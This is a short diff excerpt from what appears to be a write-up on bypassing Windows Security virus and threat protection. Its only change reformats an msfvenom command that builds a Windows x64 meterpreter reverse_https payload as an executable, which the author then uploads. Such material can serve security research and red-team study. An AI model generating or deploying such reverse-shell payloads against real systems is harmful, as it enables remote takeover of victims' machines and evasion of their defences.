@@ -9,7 +9,7 @@ I wanted to bypass the Windows Security Virus &amp; Threat Protection with some 
 
 So I tried the vanilla version of the meterpreter that you can easily forge from msfvenom:
 
-msfvenom -p windows/x64/meterpreter/reverse\_https LHOST=eth0 LPORT=4444 -f exe -o test\_exploit.exe
+```msfvenom -p windows/x64/meterpreter/reverse\_https LHOST=eth0 LPORT=4444 -f exe -o test\_exploit.exe```
 
 With that I uploaded this piece of software that is executable for windows and it contains our malware vanilla (PE32+ executable (GUI) x86-64, for MS Windows). 
 
